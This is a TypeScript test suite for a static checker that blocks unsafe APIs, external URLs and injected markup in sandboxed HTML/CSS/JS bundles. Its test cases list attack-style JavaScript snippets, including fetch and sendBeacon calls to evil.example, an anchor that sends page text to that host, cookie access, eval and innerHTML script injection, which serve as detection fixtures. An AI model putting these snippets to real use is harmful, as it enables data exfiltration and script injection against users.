/**
 * 静态检查测试：好/坏 bundle 与各类禁止项。
 * 运行：npm test（先 build，再 node --test dist/tests/*.test.js）
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { parseSelector, selectorExists, staticCheck } from '../static-check.js';

function loadFixture(name: string): unknown {
  const path = fileURLToPath(new URL(`../../fixtures/${name}`, import.meta.url));
  return JSON.parse(readFileSync(path, 'utf8')) as unknown;
}

function clone<T>(value: T): T {
  return JSON.parse(JSON.stringify(value)) as T;
}

function codes(raw: unknown): string[] {
  return staticCheck(raw).issues.map((issue) => issue.code);
}

function errors(raw: unknown): string[] {
  return staticCheck(raw)
    .issues.filter((issue) => issue.severity === 'error')
    .map((issue) => `${issue.code}: ${issue.message}`);
}

const good = loadFixture('good-basic.bundle.json');

test('good-basic 通过全部静态检查', () => {
  const result = staticCheck(good);
  assert.deepEqual(errors(good), []);
  assert.notEqual(result.bundle, null);
});

test('good-basic 的冒烟选择器可以静态定位', () => {
  assert.equal(selectorExists((good as { html: string }).html, "[data-mp-action='step']"), true);
  assert.equal(selectorExists((good as { html: string }).html, "[data-mp-state='searching']"), false);
});

test('bad-external-link：外链图片触发 HTML_EXTERNAL_URL', () => {
  assert.ok(codes(loadFixture('bad-external-link.bundle.json')).includes('HTML_EXTERNAL_URL'));
});

test('bad-fetch：fetch 触发 JS_FORBIDDEN_API', () => {
  assert.ok(codes(loadFixture('bad-fetch.bundle.json')).includes('JS_FORBIDDEN_API'));
});

test('bad-parent：window.parent 触发 JS_FORBIDDEN_API', () => {
  assert.ok(codes(loadFixture('bad-parent.bundle.json')).includes('JS_FORBIDDEN_API'));
});

test('bad-overflow / bad-console-error / bad-smoke-fail 的静态检查应为干净（由浏览器检查判定）', () => {
  for (const name of ['bad-overflow.bundle.json', 'bad-console-error.bundle.json', 'bad-smoke-fail.bundle.json']) {
    assert.deepEqual(errors(loadFixture(name)), [], name);
  }
});

test('超过 2 MiB 的 bundle 触发 BUNDLE_TOO_LARGE', () => {
  const huge = clone(good) as { css: string };
  huge.css = '.mp-page{color:var(--mp-ink)}' + 'x'.repeat(2 * 1024 * 1024);
  assert.ok(codes(huge).includes('BUNDLE_TOO_LARGE'));
});

test('manifest 缺字段触发 MANIFEST_INVALID', () => {
  const broken = clone(good) as Record<string, unknown>;
  const manifest = broken.manifest as Record<string, unknown>;
  delete manifest.a11y;
  delete manifest.knowledge_point_ids;
  delete manifest.interactions;
  const found = codes(broken);
  assert.ok(found.includes('MANIFEST_INVALID'));
});

test('manifest 冒烟步骤非法触发 MANIFEST_INVALID', () => {
  const broken = clone(good) as Record<string, unknown>;
  const manifest = broken.manifest as { interactions: Array<Record<string, unknown>> };
  manifest.interactions[0] = {
    id: 'Bad Id',
    type: '',
    label: '',
    smoke: { action: 'drag', selector: '[', expect: '' }
  };
  assert.ok(codes(broken).includes('MANIFEST_INVALID'));
});

test('schema / runtime / 字段类型错误触发 BUNDLE_SCHEMA_INVALID', () => {
  const cases: unknown[] = [
    null,
    'not-an-object',
    { ...(clone(good) as object), schema_version: '2.0' },
    { ...(clone(good) as object), runtime_version: undefined },
    { ...(clone(good) as object), html: 42 },
    { ...(clone(good) as object), manifest: null }
  ];
  for (const item of cases) {
    assert.ok(codes(item).includes('BUNDLE_SCHEMA_INVALID'), JSON.stringify(item)?.slice(0, 40));
  }
});

test('runtime_version 与宿主不一致触发 RUNTIME_VERSION_MISMATCH', () => {
  const mismatch = staticCheck({ ...(clone(good) as object), runtime_version: '1.1.0' });
  assert.ok(mismatch.issues.some((issue) => issue.code === 'RUNTIME_VERSION_MISMATCH'));
});

function withJs(js: string): unknown {
  const bundle = clone(good) as { js: string };
  bundle.js = js;
  return bundle;
}

test('JS 禁止 API（AST 检查，含计算属性与混淆写法）', () => {
  const snippets: Array<[string, string]> = [
    ["fetch('https://evil.example')", 'fetch'],
    ["window['parent'].document.title = 'x'", "window['parent']"],
    ["document['cookie']", "document['cookie']"],
    ["localStorage.setItem('a', 'b')", 'localStorage'],
    ["sessionStorage.getItem('a')", 'sessionStorage'],
    ["indexedDB.open('db')", 'indexedDB'],
    ["navigator.sendBeacon('https://evil.example', 'x')", 'sendBeacon'],
    ["new WebSocket('wss://evil.example')", 'WebSocket'],
    ["new XMLHttpRequest()", 'XMLHttpRequest'],
    ["new EventSource('/sse')", 'EventSource'],
    ["eval('1')", 'eval'],
    ["new Function('return 1')", 'new Function'],
    ["setTimeout('alert(1)', 10)", 'setTimeout 字符串'],
    ["document.write('<p>x</p>')", 'document.write'],
    ["window.open('https://evil.example')", 'window.open'],
    ["document.createElement('script')", 'createElement script'],
    ["new Worker('/worker.js')", 'Worker'],
    ["location.href = 'https://evil.example'", 'location 赋值'],
    ["window.postMessage({}, '*')", 'postMessage'],
    ["import('/x.js')", 'import()'],
    ["globalThis.fetch('https://evil.example')", 'globalThis.fetch'],
    ["navigator.clipboard.readText()", 'clipboard'],
    ["document.body.innerHTML = '<script>1</script>'", 'innerHTML 注入'],
    ["document.body.innerHTML = '<style>body{background:url(https://evil.example)}</style>'", 'innerHTML style 注入'],
    ["document.body.innerHTML = '<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">'", 'innerHTML meta refresh'],
    ["document.body.innerHTML = '<base href=\"https://evil.example/\">'", 'innerHTML base'],
    ["document.body.innerHTML = '<form action=\"https://evil.example\"></form>'", 'innerHTML form']
  ];
  for (const [snippet, label] of snippets) {
    const found = codes(withJs(snippet));
    assert.ok(found.includes('JS_FORBIDDEN_API'), `未拦截：${label}（${snippet}）`);
  }
});

test('JS 禁止外部 URL 赋值、setAttribute 与导航别名', () => {
  const snippets = [
    "const a = document.createElement('a'); a.href = 'https://evil.example/?' + document.body.innerText; a.click();",
    "const a = document.createElement('a'); a.setAttribute('href', 'https://evil.example');",
    "const l = window.location; l.href = 'https://evil.example';",
    "const a = document.createElement('a'); a.href = '/relative/path';"
  ];
  for (const snippet of snippets) {
    assert.ok(codes(withJs(snippet)).includes('JS_FORBIDDEN_API'), `未拦截：${snippet}`);
  }
  const safe = [
    "const a = document.createElement('a'); a.href = '#section';",
    "const img = document.createElement('img'); img.src = 'data:image/png;base64,AA==';"
  ];
  for (const snippet of safe) {
    assert.deepEqual(errors(withJs(snippet)), [], `误报：${snippet}`);
  }
});

test('允许的 JS（DOM、事件、定时器、MockFinal）不误报', () => {
  const ok = withJs(
    "(function () { var el = document.querySelector('.mp-page'); var t = setTimeout(function () { el.dataset.mpState = 'ready'; }, 10); clearTimeout(t); el.addEventListener('click', function () { MockFinal.emit('interaction', { id: 'x' }); }); MockFinal.ready({ title: 'x' }); })();"
  );
  assert.deepEqual(errors(ok), []);
});

test('JS 语法错误触发 JS_PARSE_ERROR', () => {
  assert.ok(codes(withJs('function (')).includes('JS_PARSE_ERROR'));
});

test('HTML 禁止标签 / 属性 / URL', () => {
  const cases: Array<[string, string]> = [
    ['<script>alert(1)</script>', 'HTML_FORBIDDEN_TAG'],
    ['<style>.a{color:red}</style>', 'HTML_FORBIDDEN_TAG'],
    ['<iframe src="#"></iframe>', 'HTML_FORBIDDEN_TAG'],
    ['<form action="#"></form>', 'HTML_FORBIDDEN_TAG'],
    ['<div onclick="alert(1)"></div>', 'HTML_FORBIDDEN_ATTR'],
    ['<a href="#" target="_blank">x</a>', 'HTML_FORBIDDEN_ATTR'],
    ['<a href="javascript:alert(1)">x</a>', 'HTML_EXTERNAL_URL'],
    ['<a href="https://example.com">x</a>', 'HTML_EXTERNAL_URL'],
    ['<img src="./local.png" alt="">', 'HTML_EXTERNAL_URL'],
    ['<img src="data:text/html,<b>x</b>" alt="">', 'HTML_EXTERNAL_URL'],
    ['<video poster="https://example.com/p.png"></video>', 'HTML_EXTERNAL_URL']
  ];
  for (const [html, code] of cases) {
    const bundle = clone(good) as { html: string };
    bundle.html = html;
    assert.ok(codes(bundle).includes(code), `${html} 应触发 ${code}，实际 ${codes(bundle).join(',')}`);
  }
});

test('HTML 允许内联 SVG、data:image 与页内锚点', () => {
  const bundle = clone(good) as { html: string };
  bundle.html =
    '<div class="mp-page"><h1>x</h1><a href="#sec">跳转</a><img src="data:image/png;base64,iVBORw0KGgo=" alt="点"><svg viewBox="0 0 10 10"><defs><linearGradient id="g"></linearGradient></defs><rect fill="url(#g)" width="10" height="10"></rect></svg><p id="sec">锚点</p></div>';
  assert.deepEqual(errors(bundle), []);
});

test('HTML 中的 shell 逃逸序列触发 SHELL_ESCAPE_SEQUENCE', () => {
  for (const html of ['<div></script></div>', '<div></style></div>', '<div><!-- x --></div>']) {
    const bundle = clone(good) as { html: string };
    bundle.html = html;
    assert.ok(codes(bundle).includes('SHELL_ESCAPE_SEQUENCE'), html);
  }
});

test('CSS 禁止项', () => {
  const cases: Array<[string, string]> = [
    ['@import url("https://example.com/a.css");', 'CSS_EXTERNAL_URL'],
    ['.a { background: url(https://example.com/a.png); }', 'CSS_EXTERNAL_URL'],
    ['.a { background: url(./a.png); }', 'CSS_EXTERNAL_URL'],
    ['.a { overflow: auto; }', 'CSS_OVERFLOW_SCROLL'],
    ['.a { overflow-y: scroll; }', 'CSS_OVERFLOW_SCROLL'],
    ['.a { width: expression(alert(1)); }', 'CSS_FORBIDDEN_PROPERTY'],
    ['.a { position: fixed; top: 0; }', 'POSITION_FIXED']
  ];
  for (const [css, code] of cases) {
    const bundle = clone(good) as { css: string };
    bundle.css = css + '\n.mp-page{height:100dvh;overflow:hidden}';
    assert.ok(codes(bundle).includes(code), `${css} 应触发 ${code}`);
  }
});

test('CSS 允许 data: 与页内引用', () => {
  const bundle = clone(good) as { css: string };
  bundle.css =
    '.mp-page { height: 100dvh; overflow: hidden; background: url(data:image/png;base64,iVBORw0KGgo=); } svg rect { fill: url(#g); }';
  assert.deepEqual(errors(bundle), []);
});

test('冒烟选择器语法与存在性', () => {
  assert.equal(typeof parseSelector('[data-mp-action="step"]'), 'object');
  assert.equal(typeof parseSelector('['), 'string');
  assert.equal(typeof parseSelector(''), 'string');
  assert.equal(typeof parseSelector('.a > .b'), 'object');
  assert.equal(selectorExists('<div><button data-mp-action="step"></button></div>', "[data-mp-action='step']"), true);
  assert.equal(selectorExists('<div><span></span></div>', "[data-mp-action='step']"), false);
  assert.equal(selectorExists('<div><span></span></div>', 'div:first-child'), null);
});

test('冒烟选择器在静态 html 中不存在且 js 未引用时触发 SMOKE_SELECTOR_NOT_FOUND', () => {
  const bundle = clone(good) as { html: string; manifest: { interactions: Array<Record<string, unknown>> } };
  bundle.html = '<div class="mp-page"><h1>x</h1></div>';
  bundle.manifest.interactions[0] = {
    id: 'demo',
    type: 'simulation',
    label: '点击',
    smoke: { action: 'click', selector: "[data-mp-action='missing']", expect: "[data-mp-state='x']" }
  };
  assert.ok(codes(bundle).includes('SMOKE_SELECTOR_NOT_FOUND'));
});
